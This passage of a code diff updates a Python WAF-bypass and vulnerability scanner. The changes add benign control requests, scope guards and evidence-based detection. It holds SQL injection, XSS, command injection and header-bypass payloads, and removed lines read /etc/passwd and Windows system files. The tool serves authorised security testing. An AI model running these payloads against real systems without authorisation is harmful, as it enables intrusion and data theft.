+        }, sort_keys=True, default=repr, separators=(',', ':'))
+        return hashlib.sha256(material.encode('utf-8', errors='replace')).hexdigest()
+
+    @staticmethod
+    def _result_has_evidence(result: Optional[Dict[str, Any]], *types: str) -> bool:
+        if not isinstance(result, dict):
+            return False
+        wanted = set(types)
+        return any(
+            isinstance(item, dict) and item.get('type') in wanted
+            for item in (result.get('evidence') or [])
+        )
+
+    @staticmethod
+    def _benign_control_body(data: Any) -> Any:
+        """Create a syntax-preserving, non-attack body for a matched control."""
+        if data is None:
+            return None
+
+        def _replace(value):
+            if isinstance(value, dict):
+                return {k: _replace(v) for k, v in value.items()}
+            if isinstance(value, list):
+                return [_replace(v) for v in value]
+            if isinstance(value, bool):
+                return False
+            if isinstance(value, (int, float)):
+                return 1
+            if value is None:
+                return None
+            return 'blackthorn-control'
+
+        if isinstance(data, (dict, list)):
+            return _replace(data)
+        if isinstance(data, bytes):
+            return b'blackthorn-control'
+        if isinstance(data, str):
+            try:
+                decoded = json.loads(data)
+                return json.dumps(_replace(decoded), separators=(',', ':'))
+            except Exception:
+                pass
+            try:
+                pairs = parse_qsl(data, keep_blank_values=True)
+                if pairs and ('=' in data or '&' in data):
+                    return urlencode([(k, 'blackthorn-control') for k, _ in pairs])
+            except Exception:
+                pass
+            return 'blackthorn-control'
+        return 'blackthorn-control'
+
+    def _derive_control_request(self, method: str, path: str, headers: Dict[str, Any],
+                                data: Any, probe: Dict[str, Any]) -> Optional[Dict[str, Any]]:
+        """Derive the clean request that differs only at the tested input.
+
+        Callers can provide ``probe['control']`` for an exact canonical request.
+        Query probes are automatically rebuilt with benign values. Header, body,
+        and method probes use the same route with the mutation removed.
+        """
+        explicit = probe.get('control')
+        if explicit is False:
+            return None
+        if isinstance(explicit, dict):
+            return {
+                'method': str(explicit.get('method') or method).upper(),
+                'path': str(explicit.get('path') or path),
+                'headers': dict(explicit.get('headers') or {}),
+                'data': explicit.get('data'),
+            }
+
+        parts = urlsplit(path)
+        pairs = parse_qsl(parts.query, keep_blank_values=True)
+        parameter = probe.get('parameter')
+        if not parameter and isinstance(probe.get('insertion_point'), dict):
+            parameter = probe['insertion_point'].get('name')
+        if pairs:
+            replaced = []
+            for key, value in pairs:
+                if not parameter or key == parameter:
+                    value = 'blackthorn-control'
+                replaced.append((key, value))
+            control_path = urlunsplit(('', '', parts.path or '/', urlencode(replaced), parts.fragment))
+            return {
+                'method': method.upper(), 'path': control_path,
+                'headers': dict(headers or {}), 'data': None,
+            }
+
+        if data is not None:
+            # Preserve the media type so a JSON/XML endpoint is compared with the
+            # same parser, while removing unrelated mutation headers.
+            # The body is the mutation, so preserve all endpoint-specific
+            # headers (tenant/version/media-type) in the benign request.
+            keep_headers = dict(headers or {})
+            return {
+                'method': method.upper(), 'path': path,
+                'headers': keep_headers, 'data': self._benign_control_body(data),
+            }
+
+        if headers:
+            insertion = probe.get('insertion_point')
+            if isinstance(insertion, dict) and insertion.get('type') == 'header':
+                injected_name = str(insertion.get('name') or '').lower()
+                clean_headers = {
+                    k: v for k, v in headers.items()
+                    if str(k).lower() != injected_name
+                }
+            else:
+                # Legacy header techniques treat all supplied headers as the
+                # mutation and compare with the same route without them.
+                clean_headers = {}
+            return {
+                'method': method.upper(), 'path': path,
+                'headers': clean_headers, 'data': None,
+            }
+
+        if method.upper() != 'GET':
+            return {'method': 'GET', 'path': path, 'headers': {}, 'data': None}
+
+        # A path-only mutation needs an explicit canonical path. Falling back to
+        # the root baseline keeps legacy coverage but is labelled global/low.
+        return None
+
+    def _path_url(self, path: str) -> str:
+        if str(path).startswith(('http://', 'https://')):
+            return str(path)
+        return f"{self.target}{path}"
+
+    def _same_target_origin(self, url: str) -> bool:
+        try:
+            target = urlparse(self.target)
+            candidate = urlparse(url)
+            return (candidate.scheme.lower(), candidate.hostname, candidate.port or
+                    (443 if candidate.scheme.lower() == 'https' else 80)) == (
+                        target.scheme.lower(), target.hostname, target.port or
+                        (443 if target.scheme.lower() == 'https' else 80)
+                    )
+        except Exception:
+            return False
+
+    def _get_control_snapshot(self, request_spec: Dict[str, Any]) -> Optional[Dict[str, Any]]:
+        method = str(request_spec.get('method') or 'GET').upper()
+        path = str(request_spec.get('path') or '/')
+        url = self._path_url(path)
+        # Never carry the authenticated target session to another origin.
+        if not self._same_target_origin(url) or not self._in_scope(url):
+            logger.debug(f"Control request blocked by origin/scope guard: {url}")
+            return None
+        extra_headers = dict(request_spec.get('headers') or {})
+        data = request_spec.get('data')
+        req_headers = dict(self._session.headers)
+        req_headers.update(extra_headers)
+        cache_key = self._stable_request_key(method, url, req_headers, data, 'control')
+        with self._cache_lock:
+            cached = self._control_cache.get(cache_key)
+            if cached is not None:
+                return dict(cached)
+
+        kwargs = dict(
+            method=method, url=url, headers=req_headers, data=data,
+            timeout=self.timeout, allow_redirects=False, verify=False,
+        )
+        if self.proxy_pool:
+            proxy = random.choice(self.proxy_pool)
+            kwargs['proxies'] = {'http': proxy, 'https': proxy}
+        self._limiter.acquire()
+        try:
+            response = self._session.request(**kwargs)
+            self._log_http_transaction(method, url, req_headers, response)
+            if response is None:
+                return None
+            snap = snapshot_response(response, _normalize_body)
+            snap['request'] = {
+                'method': method, 'path': path, 'url': url,
+                'headers': extra_headers, 'body': data,
+            }
+            with self._cache_lock:
+                self._control_cache[cache_key] = snap
+            return dict(snap)
+        except Exception as exc:
+            logger.debug(f"Matched control request failed for {method} {path}: {exc}")
+            return None
+        finally:
+            self._limiter.release()
+
+    def _root_control_snapshot(self) -> Dict[str, Any]:
+        headers = {str(k).lower(): str(v) for k, v in (self._baseline_headers or {}).items()}
+        safe_names = {
+            'content-type', 'content-length', 'location', 'server', 'x-powered-by',
+            'cache-control', 'vary', 'www-authenticate', 'content-security-policy',
+        }
+        body = self._baseline_body_sample or ''
+        return {
+            'status': int(self._baseline_status or 0),
+            'size': int(self._baseline_size or 0),
+            'content_type': headers.get('content-type', ''),
+            'location': headers.get('location', ''),
+            'headers': headers,
+            'safe_headers': {k: v for k, v in headers.items() if k in safe_names},
+            'hash': hashlib.sha256(body.encode('utf-8', errors='replace')).hexdigest(),
+            'text': body,
+            'normalized': self._baseline_norm or _normalize_body(body),
+            'request': {'method': 'GET', 'path': '/', 'url': self.target,
+                        'headers': {}, 'body': None},
+        }
+
     def _test_request(
         self,
         headers: Optional[dict] = None,
@@ -2487,6 +3145,7 @@ class CloudFrontBypasser(ExtraTechniques):
         technique: Optional[str] = None,
         data: Any = None,
         use_cache: bool = True,
+        probe: Optional[Dict[str, Any]] = None,
     ) -> Optional[Dict[str, Any]]:
         """
         Test a single request configuration with error handling.
@@ -2506,7 +3165,8 @@ class CloudFrontBypasser(ExtraTechniques):
         Returns:
             Result dictionary or None if request failed
         """
-        url = f"{self.target}{path}"
+        method = str(method or 'GET').upper()
+        url = self._path_url(path)
 
         # Work on a private copy and strip the out-of-band technique marker so it
         # never reaches the target and never pollutes the cache key.
@@ -2514,10 +3174,26 @@ class CloudFrontBypasser(ExtraTechniques):
         marker = headers.pop('X-Technique', None)
         if technique is None:
             technique = marker or 'Unknown'
+        probe = dict(probe or {})
 
-        # Cache key based ONLY on what actually goes on the wire (real headers).
-        body_key = '' if data is None else hash(repr(data))
-        cache_key = f"{method}:{path}:{body_key}:{hash(frozenset(headers.items()))}"
+        # The authenticated scanner transport is target-origin only. This blocks
+        # accidental bearer/cookie leakage when a technique supplies an absolute
+        # third-party URL and enforces user scope at the request chokepoint.
+        if not self._same_target_origin(url) or not self._in_scope(url):
+            logger.debug(f"Probe blocked by origin/scope guard: {url}")
+            return None
+
+        # Establish a benign control before sending the mutation. Query/body/
+        # header/method probes receive a matched control; legacy path-only probes
+        # fall back to the scan root and are explicitly labelled low-confidence.
+        control_spec = self._derive_control_request(method, path, headers, data, probe)
+        control_snapshot = self._get_control_snapshot(control_spec) if control_spec else None
+        control_scope = 'matched' if control_snapshot is not None else 'global'
+        if control_snapshot is None:
+            control_snapshot = self._root_control_snapshot()
+
+        # Verdicts depend on both the wire request and oracle/control context.
+        cache_key = self._stable_request_key(method, url, headers, data, probe)
 
         # Check cache first (now actually hits, because the key is technique-free).
         # Re-confirmation replays pass use_cache=False so they hit the network
@@ -2569,8 +3245,39 @@ class CloudFrontBypasser(ExtraTechniques):
             if self.jitter > 0:
                 time.sleep(random.uniform(0, self.jitter))
 
-            # Check if bypass succeeded
-            bypass_result = self._is_bypass_fast(resp)
+            # Compare with the matched control and apply any detector-specific
+            # proof oracle (marker/signature/header/reflection).
+            bypass_result = self._is_bypass_fast(
+                resp, control_snapshot=control_snapshot,
+                oracle=probe.get('oracle'), control_scope=control_scope,
+            )
+            observed_snapshot = snapshot_response(resp, _normalize_body)
+
+            parameter = probe.get('parameter')
+            insertion_point = probe.get('insertion_point')
+            payload = probe.get('payload')
+            if (not parameter or payload is None) and urlsplit(path).query:
+                pairs = parse_qsl(urlsplit(path).query, keep_blank_values=True)
+                if pairs:
+                    if parameter:
+                        selected = next(((k, v) for k, v in pairs if k == parameter), pairs[-1])
+                    else:
+                        selected = pairs[-1]
+                    parameter = parameter or selected[0]
+                    if payload is None:
+                        payload = selected[1]
+            if insertion_point is None and parameter:
+                insertion_point = {'type': 'query', 'name': parameter}
+
+            category = str(probe.get('category') or 'OTHER')
+            fingerprint_material = '|'.join([
+                urlparse(self.target).netloc.lower(), method,
+                urlsplit(path).path or '/', category,
+                str((insertion_point or {}).get('type', '') if isinstance(insertion_point, dict) else insertion_point),
+                str((insertion_point or {}).get('name', '') if isinstance(insertion_point, dict) else ''),
+                str(technique).split(':', 1)[0].strip().lower(),
+            ])
+            fingerprint = hashlib.sha256(fingerprint_material.encode()).hexdigest()[:24]
 
             result = {
                 'bypass': bypass_result['bypass'],
@@ -2578,10 +3285,36 @@ class CloudFrontBypasser(ExtraTechniques):
                 'headers': dict(headers),
                 'method': method,
                 'path': path,
+                'url': url,
+                'target': self.target,
                 'size': len(resp.content),
                 'technique': technique,
                 'reason': bypass_result['reason'],
-                'severity': bypass_result['severity']
+                'severity': bypass_result['severity'],
+                'category': category,
+                'kind': bypass_result.get('kind', 'observation'),
+                'verification_status': bypass_result.get('verification_status', 'not_detected'),
+                'confidence': bypass_result.get('confidence', 'none'),
+                'comparison': bypass_result.get('comparison', {}),
+                'evidence': bypass_result.get('evidence', []),
+                'request': {
+                    'method': method, 'url': url, 'path': path,
+                    'headers': dict(headers), 'body': data,
+                },
+                'response': public_response(
+                    observed_snapshot, bypass_result.get('evidence_needle', '')
+                ),
+                'baseline': {
+                    **public_response(control_snapshot),
+                    'scope': control_scope,
+                    'request': dict(control_snapshot.get('request') or {}),
+                },
+                'insertion_point': insertion_point,
+                'payload': payload if payload is not None else '',
+                'detector_id': probe.get('detector_id') or 'response-differential-v2',
+                'fingerprint': fingerprint,
+                'finding_id': f'bt-{fingerprint}',
+                'probe': probe,
             }
 
             # Attach a copy-paste reproduction command built from the request as
@@ -2619,106 +3352,40 @@ class CloudFrontBypasser(ExtraTechniques):
         finally:
             self._limiter.release()
     
-    def _is_bypass_fast(self, response: requests.Response) -> Dict[str, Any]:
-        """Optimized bypass detection with pre-compiled patterns"""
-        
-        if self._baseline_size is None:
-            return {'bypass': False, 'reason': 'No baseline', 'severity': 'INFO'}
-        
-        status = response.status_code
-        
-        # Quick rejection: error responses are NOT bypasses
-        if status >= 400:
-            return {'bypass': False, 'reason': f'Blocked: {status}', 'severity': 'INFO'}
-        
+    def _is_bypass_fast(
+        self,
+        response: requests.Response,
+        control_snapshot: Optional[Dict[str, Any]] = None,
+        oracle: Optional[Dict[str, Any]] = None,
+        control_scope: str = 'global',
+    ) -> Dict[str, Any]:
+        """Evidence-aware response classification.
+
+        A generic response delta is only a candidate. Confirmed findings require
+        a matched blocked→allowed transition or a detector-specific proof oracle.
+        HTTP 5xx bodies are still inspected so error-based injection is visible.
+        """
+        if self._baseline_size is None and control_snapshot is None:
+            return {
+                'bypass': False, 'reason': 'No comparison control',
+                'severity': 'INFO', 'confidence': 'none',
+                'verification_status': 'not_detected', 'kind': 'observation',
+                'comparison': {}, 'evidence': [],
+            }
         try:
-            content = response.content
-            current_size = len(content)
-
-            # CRITICAL: Status code changed from blocked to allowed
-            if self._baseline_status in [403, 401, 429] and status == 200:
-                return {
-                    'bypass': True,
-                    'reason': f'Auth bypass: {self._baseline_status} → {status}',
-                    'severity': 'CRITICAL'
-                }
-
-            # Size comparison that accounts for the baseline's natural jitter band.
-            # Effective change must exceed the observed jitter before it counts.
-            if self._baseline_size > 0:
-                raw_diff = abs(current_size - self._baseline_size)
-                size_diff = max(0, raw_diff - self._baseline_jitter)
-                size_diff_percent = (size_diff / self._baseline_size) * 100
-
-                # HIGH: Significant size difference beyond jitter (>15% change)
-                if size_diff_percent > 15 and size_diff > 200:
-                    return {
-                        'bypass': True,
-                        'reason': f'Content diff: {size_diff_percent:.0f}% change (jitter ±{self._baseline_jitter}b)',
-                        'severity': 'HIGH'
-                    }
-
-            # Content comparison. For static pages a raw hash mismatch is enough; for
-            # dynamic pages compare NORMALIZED bodies via similarity ratio so that
-            # CSRF tokens / timestamps don't masquerade as bypasses.
-            if abs(current_size - self._baseline_size) <= max(500, self._baseline_jitter):
-                if not self._baseline_dynamic:
-                    current_hash = hashlib.md5(content).hexdigest()
-                    if current_hash != self._baseline_hash:
-                        return {
-                            'bypass': True,
-                            'reason': 'Different content (hash mismatch)',
-                            'severity': 'HIGH'
-                        }
-                else:
-                    cur_norm = _normalize_body(response.text if current_size else "")
-                    ratio = difflib.SequenceMatcher(None, self._baseline_norm, cur_norm).quick_ratio()
-                    if ratio < 0.90:
-                        return {
-                            'bypass': True,
-                            'reason': f'Different content ({ratio*100:.0f}% similar after token-normalization)',
-                            'severity': 'HIGH'
-                        }
-
-            # Check response body for error indicators (first 3KB only for speed)
-            body_sample = response.text[:3000].lower() if current_size > 0 else ""
-            
-            # Use pre-compiled regex for speed
-            if ERROR_PATTERNS.search(body_sample):
-                match = ERROR_PATTERNS.search(body_sample)
-                return {
-                    'bypass': True,
-                    'reason': f'Backend exposed: {match.group(1)}',
-                    'severity': 'CRITICAL' if 'sql' in match.group(1).lower() or 'exception' in match.group(1).lower() else 'HIGH'
-                }
-            
-            # Check headers (fast dict lookups)
-            resp_headers_lower = {k.lower(): v for k, v in response.headers.items()}
-            
-            # Backend server header exposed
-            server = resp_headers_lower.get('server', '').lower()
-            if server and BACKEND_PATTERNS.search(server):
-                baseline_server = self._baseline_headers.get('server', '').lower()
-                if not BACKEND_PATTERNS.search(baseline_server):
-                    return {
-                        'bypass': True,
-                        'reason': f'Backend server: {response.headers.get("server")}',
-                        'severity': 'MEDIUM'
-                    }
-            
-            # X-Powered-By exposed
-            if 'x-powered-by' in resp_headers_lower and 'x-powered-by' not in self._baseline_headers:
-                return {
-                    'bypass': True,
-                    'reason': f'Tech exposed: {resp_headers_lower["x-powered-by"]}',
-                    'severity': 'MEDIUM'
-                }
-            
-            return {'bypass': False, 'reason': 'No bypass detected', 'severity': 'INFO'}
-            
+            observed = snapshot_response(response, _normalize_body)
+            control = control_snapshot or self._root_control_snapshot()
+            return analyze_response(
+                observed, control, oracle=oracle, control_scope=control_scope,
+            )
         except Exception as e:
             logger.debug(f"Bypass detection error: {e}")
-            return {'bypass': False, 'reason': 'Detection error', 'severity': 'INFO'}
+            return {
+                'bypass': False, 'reason': f'Detection error: {e}',
+                'severity': 'INFO', 'confidence': 'none',
+                'verification_status': 'error', 'kind': 'observation',
+                'comparison': {}, 'evidence': [],
+            }
     
     def _handle_rate_limit(self, response: requests.Response):
         """Handle rate limit detection and auto-adjust delay."""
@@ -2851,7 +3518,9 @@ class CloudFrontBypasser(ExtraTechniques):
             logger.error(f"Error in bypass detection: {e}")
             return {'bypass': False, 'reason': f'Detection error: {str(e)}', 'severity': 'INFO'}
     
-    def _batch_test(self, test_cases: List[Dict], method: str = 'GET', verbose: bool = True) -> List[Dict[str, Any]]:
+    def _batch_test(self, test_cases: List[Dict], method: str = 'GET',
+                    verbose: bool = True,
+                    include_observations: bool = False) -> List[Dict[str, Any]]:
         """
         Optimized batch testing - run multiple tests in parallel
         
@@ -2861,7 +3530,8 @@ class CloudFrontBypasser(ExtraTechniques):
             verbose: Whether to print bypass results
         
         Returns:
-            List of bypass results
+            List of findings/candidates. Negative wire observations are returned
+            only when ``include_observations`` is explicitly requested.
         """
         results = []
         if not test_cases:
@@ -2874,13 +3544,19 @@ class CloudFrontBypasser(ExtraTechniques):
             # legacy X-Technique header, but never send it on the wire.
             technique = test_case.get('technique') or headers.pop('X-Technique', None) or 'Unknown'
             data = test_case.get('data')
+            probe = dict(test_case.get('probe') or {})
+            for key in ('category', 'payload', 'parameter', 'insertion_point',
+                        'oracle', 'detector_id', 'control'):
+                if key in test_case and key not in probe:
+                    probe[key] = test_case[key]
             return self._test_request(headers, method=test_case.get('method', method),
-                                      path=path, technique=technique, data=data)
+                                      path=path, technique=technique, data=data,
+                                      probe=probe)
 
         def _collect(future):
             try:
                 result = future.result()
-                if result:
+                if result and (result.get('bypass') or include_observations):
                     results.append(result)
                     if verbose and result.get('bypass'):
                         print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
@@ -3038,8 +3714,8 @@ class CloudFrontBypasser(ExtraTechniques):
         
         try:
             # Make baseline request for WAF detection
-            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
-            if not resp:
+            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if resp is None:
                 return results
             
             headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
@@ -3117,8 +3793,8 @@ class CloudFrontBypasser(ExtraTechniques):
         print("  [*] Detecting CDN...")
         
         try:
-            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
-            if not resp:
+            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if resp is None:
                 return results
             
             headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
@@ -3198,8 +3874,8 @@ class CloudFrontBypasser(ExtraTechniques):
         
         try:
             # Make initial request
-            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
-            if not resp:
+            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if resp is None:
                 print("  [!] Could not detect OS - target unreachable")
                 return 'unknown', 0, results
             
@@ -3251,8 +3927,8 @@ class CloudFrontBypasser(ExtraTechniques):
             
             for path in error_test_paths:
                 try:
-                    err_resp = safe_request(f"{self.target}{path}", timeout=self.timeout)
-                    if err_resp and err_resp.status_code in [400, 403, 404, 500]:
+                    err_resp = self._scoped_safe_request(f"{self.target}{path}", timeout=self.timeout)
+                    if err_resp is not None and err_resp.status_code in [400, 403, 404, 500]:
                         err_body = err_resp.text.lower()[:5000]
                         
                         # Check for OS-specific error messages
@@ -3371,7 +4047,7 @@ class CloudFrontBypasser(ExtraTechniques):
             '::1',  # IPv6 localhost
             'localhost',
         ]
-        
+
         header_types = [
             'X-Forwarded-For',
             'X-Real-IP',
@@ -3472,7 +4148,7 @@ class CloudFrontBypasser(ExtraTechniques):
             {'X-HTTP-Method-Override': 'CONNECT', 'X-Technique': 'X-HTTP-Method-Override: CONNECT'},
             {'X-HTTP-Method-Override': 'TRACE', 'X-Technique': 'X-HTTP-Method-Override: TRACE'},
         ]
-        
+
         for headers in override_headers:
             # Try as both GET and POST
             for method in ['GET', 'POST']:
@@ -3529,7 +4205,7 @@ class CloudFrontBypasser(ExtraTechniques):
         test_cases = [
             {'headers': {'X-Original-URL': '/admin'}, 'path': cache_buster, 'technique': 'X-Original-URL cache poison'},
             {'headers': {'X-Rewrite-URL': '/admin'}, 'path': cache_buster, 'technique': 'X-Rewrite-URL cache poison'},
-            {'headers': {'X-Forwarded-Host': 'evil.com'}, 'path': cache_buster, 'technique': 'X-Forwarded-Host cache poison'},
+            {'headers': {'X-Forwarded-Host': 'blackthorn.invalid'}, 'path': cache_buster, 'technique': 'X-Forwarded-Host cache poison'},
         ]
         return self._batch_test(test_cases)
 
@@ -3538,7 +4214,22 @@ class CloudFrontBypasser(ExtraTechniques):
     # ============================================================================
     
     def _test_sqli_bypass(self) -> List[Dict[str, Any]]:
-        """WAF-evading SQL injection payloads - optimized batch"""
+        """SQL injection detection using error and boolean-differential proof."""
+        from .crawler import build_injection_path
+        sql_errors = [
+            r'you have an error in your sql syntax', r'warning.{0,80}mysql',
+            r'mysql_(?:fetch|query|num_rows)', r'postgresql.{0,80}error',
+            r'pg_query\s*\(', r'syntax error at or near',
+            r'unterminated quoted string', r'unclosed quotation mark',
+            r'microsoft ole db provider for sql server', r'sqlserver.{0,40}jdbc',
+            r'ora-\d{5}', r'sqlite(?:3)?(?::| error)',
+            r'near ["\'][^"\']+["\']: syntax error',
+        ]
+        error_oracle = {
+            'type': 'regex', 'patterns': sql_errors, 'severity': 'HIGH',
+            'reason': 'Database error appears only after the SQL probe',
+            'verification_status': 'confirmed', 'kind': 'finding',
+        }
         sqli_payloads = [
             "/?id=1'/**/OR/**/1=1--",
             "/?id=1'/*!50000OR*/1=1--",
@@ -3548,21 +4239,99 @@ class CloudFrontBypasser(ExtraTechniques):
             "/?id=-1'+UnIoN+SeLeCt+1,2,3--",
         ]
         test_cases = [
-            {'headers': {}, 'path': path, 'technique': f'SQLi Bypass: {path[:30]}'}
+            {
+                'headers': {}, 'path': path,
+                'technique': f'SQL injection: {path[:30]}',
+                'category': 'INJECTION', 'parameter': 'id',
+                'payload': parse_qsl(urlsplit(path).query, keep_blank_values=True)[-1][1],
+                'detector_id': 'sqli-error-differential-v2',
+                'oracle': error_oracle,
+            }
             for path in sqli_payloads
         ]
-        results = self._batch_test(test_cases)
-        # Also fuzz real discovered parameters (raw payload values + custom payloads)
+        results = [r for r in self._batch_test(test_cases)
+                   if self._result_has_evidence(r, 'response_signature')]
+
+        # Also fuzz real discovered parameters with DB-error signatures.
         raw = [
             "1'/**/OR/**/1=1--", "1'/*!50000OR*/1=1--", "1'%0aOR%0a1=1--",
-            "1'oR'1'='1", "-1'+UnIoN+SeLeCt+1,2,3--", "1' AND SLEEP(0)--",
+            "1'oR'1'='1", "-1'+UnIoN+SeLeCt+1,2,3--", "1'--",
         ]
         raw += self.custom_payloads.get('sqli', [])
-        results += self._fuzz_param_endpoints(raw, 'SQLi (param)', category='INJECTION')
+        fuzzed = self._fuzz_param_endpoints(
+            raw, 'SQL injection', category='INJECTION', oracle=error_oracle,
+            detector_id='sqli-error-differential-v2',
+        )
+        results.extend(r for r in fuzzed
+                       if self._result_has_evidence(r, 'response_signature'))
+
+        # A true predicate should behave like the benign request while a false
+        # predicate diverges. This avoids calling reflection or a normal route
+        # change SQL injection and uses no time/CPU-heavy payloads.
+        targets = self._injection_targets()[:10]
+        if not targets:
+            targets = [{'path': '/', 'params': {'id': '1'}, 'method': 'GET'}]
+        for ep in targets:
+            path, params = ep['path'], dict(ep['params'])
+            for parameter, original in params.items():
+                base = str(original or '1')
+                true_payload = f"{base}' AND '1'='1'-- -"
+                false_payload = f"{base}' AND '1'='2'-- -"
+                control_path = build_injection_path(path, params, parameter, base)
+
+                def _boolean_probe(payload, label):
+                    return self._test_request(
+                        path=build_injection_path(path, params, parameter, payload),
+                        technique=f'SQL injection boolean {label} [{parameter}]',
+                        probe={
+                            'category': 'INJECTION', 'payload': payload,
+                            'parameter': parameter,
+                            'insertion_point': {'type': 'query', 'name': parameter},
+                            'detector_id': 'sqli-boolean-pair-v2',
+                            'control': {'method': 'GET', 'path': control_path,
+                                        'headers': {}, 'data': None},
+                        },
+                    )
+
+                true_result = _boolean_probe(true_payload, 'true')
+                false_result = _boolean_probe(false_payload, 'false')
+                if not true_result or not false_result:
+                    continue
+                true_cmp = true_result.get('comparison') or {}
+                false_cmp = false_result.get('comparison') or {}
+                control_status = (true_result.get('baseline') or {}).get('status')
+                true_matches = (
+                    true_result.get('status') == control_status and
+                    float(true_cmp.get('similarity', 0)) >= 0.92
+                )
+                false_differs = (
+                    false_result.get('status') != control_status or
+                    (float(false_cmp.get('similarity', 1)) < 0.72 and
+                     abs(int(false_cmp.get('size_delta', 0))) > 20)
+                )
+                if not (true_matches and false_differs):
+                    continue
+                finding = true_result
+                finding.update({
+                    'bypass': True, 'severity': 'HIGH', 'confidence': 'high',
+                    'verification_status': 'confirmed', 'kind': 'finding',
+                    'reason': (f'Boolean SQL pair changed application behavior: '
+                               f'true predicate matched control; false predicate differed'),
+                    'payloads': [true_payload, false_payload],
+                    'confirmations': 'paired true/false',
+                    '_no_reconfirm': True,
+                })
+                finding.setdefault('evidence', []).append({
+                    'type': 'boolean_differential',
+                    'description': 'True branch matched the benign control and false branch diverged',
+                    'matched': f"true={true_cmp}; false={false_cmp}", 'excerpt': '',
+                })
+                finding['reproductions'] = [true_result.get('curl'), false_result.get('curl')]
+                results.append(finding)
         return results
 
     def _test_xss_bypass(self) -> List[Dict[str, Any]]:
-        """WAF-evading cross-site scripting payloads - optimized batch"""
+        """Find unencoded reflections; browser execution remains the proof step."""
         xss_payloads = [
             "/?q=<svg/onload=alert(1)>",
             "/?q=<ScRiPt>alert(1)</ScRiPt>",
@@ -3570,72 +4339,110 @@ class CloudFrontBypasser(ExtraTechniques):
             "/?q=<scr<script>ipt>alert(1)</script>",
             "/?q=\"><script>alert(1)</script>",
         ]
-        test_cases = [
-            {'headers': {}, 'path': path, 'technique': f'XSS Bypass: {path[:30]}'}
-            for path in xss_payloads
-        ]
-        results = self._batch_test(test_cases)
+        test_cases = []
+        for path in xss_payloads:
+            payload = parse_qsl(urlsplit(path).query, keep_blank_values=True)[-1][1]
+            test_cases.append({
+                'headers': {}, 'path': path,
+                'technique': f'Reflected XSS candidate: {payload[:28]}',
+                'category': 'INJECTION', 'parameter': 'q', 'payload': payload,
+                'detector_id': 'xss-unencoded-reflection-v2',
+                'oracle': {
+                    'type': 'reflection', 'value': payload, 'severity': 'MEDIUM',
+                    'reason': ('Payload was reflected verbatim; HTML context and '
+                               'browser execution are not yet confirmed'),
+                },
+            })
+        results = [r for r in self._batch_test(test_cases)
+                   if self._result_has_evidence(r, 'unencoded_reflection')]
         raw = [
             "<svg/onload=alert(1)>", "<ScRiPt>alert(1)</ScRiPt>",
             "<scr<script>ipt>alert(1)</script>", "\"><script>alert(1)</script>",
             "'\"><img src=x onerror=alert(1)>",
         ]
         raw += self.custom_payloads.get('xss', [])
-        results += self._fuzz_param_endpoints(raw, 'XSS (param)', category='INJECTION')
+        fuzzed = self._fuzz_param_endpoints(
+            raw, 'Reflected XSS candidate', category='INJECTION',
+            oracle={
+                'type': 'reflection', 'value': '$PAYLOAD', 'severity': 'MEDIUM',
+                'reason': ('Payload was reflected verbatim; HTML context and '
+                           'browser execution are not yet confirmed'),
+            },
+            detector_id='xss-unencoded-reflection-v2',
+        )
+        results.extend(r for r in fuzzed
+                       if self._result_has_evidence(r, 'unencoded_reflection'))
         return results
     
     def _test_command_injection_bypass(self) -> List[Dict[str, Any]]:
-        """OS command injection evasion (Linux/Unix) - optimized batch"""
-        cmd_payloads = [
-            "/?cmd=;ls",
-            "/?cmd=|ls",
-            "/?cmd=`ls`",
-            "/?cmd=$(ls)",
-            "/?cmd=;ls${IFS}-la",
-            "/?cmd=;cat${IFS}/etc/passwd",
-            "/?cmd=|cat${IFS}/etc/passwd",
-            "/?cmd=;id",
-            "/?cmd=|whoami",
-            "/?cmd=$(uname${IFS}-a)",
+        """Linux/Unix command injection with harmless randomized output proof."""
+        token = f"BT{random.randrange(10**10, 10**11 - 1)}"
+        raw = [
+            f';printf {token}', f'|printf {token}', f'`printf {token}`',
+            f'$(printf {token})', f';printf${{IFS}}{token}',
         ]
-        test_cases = [
-            {'headers': {}, 'path': path, 'technique': f'Command Injection (Linux): {path[:30]}'}
-            for path in cmd_payloads
-        ]
-        results = self._batch_test(test_cases)
-        raw = [";id", "|whoami", "`id`", "$(id)", ";cat${IFS}/etc/passwd"]
         raw += self.custom_payloads.get('command_injection', [])
-        results += self._fuzz_param_endpoints(raw, 'CmdInj Linux (param)', category='INJECTION')
+        test_cases = []
+        for payload in raw[:8]:
+            path = '/?' + urlencode({'cmd': payload})
+            test_cases.append({
+                'headers': {}, 'path': path,
+                'technique': f'Command injection (Unix) [{payload[:24]}]',
+                'category': 'INJECTION', 'parameter': 'cmd', 'payload': payload,
+                'detector_id': 'command-output-marker-v2',
+                'oracle': {
+                    'type': 'marker', 'value': token, 'payload': payload,
+                    'severity': 'HIGH',
+                    'reason': f'Command output marker returned: {token}',
+                },
+            })
+        results = [r for r in self._batch_test(test_cases)
+                   if self._result_has_evidence(r, 'execution_marker')]
+        fuzzed = self._fuzz_param_endpoints(
+            raw, 'Command injection (Unix)', category='INJECTION',
+            oracle={
+                'type': 'marker', 'value': token, 'severity': 'HIGH',
+                'reason': f'Command output marker returned: {token}',
+            },
+            detector_id='command-output-marker-v2',
+        )
+        results.extend(r for r in fuzzed
+                       if self._result_has_evidence(r, 'execution_marker'))
         return results
 
     def _test_command_injection_windows(self) -> List[Dict[str, Any]]:
-        """Windows command injection evasion - optimized batch"""
-        cmd_payloads = [
-            "/?cmd=|dir",
-            "/?cmd=&dir",
-            "/?cmd=||dir",
-            "/?cmd=&&dir",
-            "/?cmd=|type+c:\\windows\\win.ini",
-            "/?cmd=&type+c:\\windows\\system.ini",
-            "/?cmd=|whoami",
-            "/?cmd=&hostname",
-            "/?cmd=|net+user",
-            "/?cmd=|set",
-            "/?cmd=|echo+%USERNAME%",
-            "/?cmd=;cmd+/c+dir",
-            "/?cmd=|powershell+-c+dir",
-        ]
-        test_cases = [
-            {'headers': {}, 'path': path, 'technique': f'Command Injection (Windows): {path[:30]}'}
-            for path in cmd_payloads
-        ]
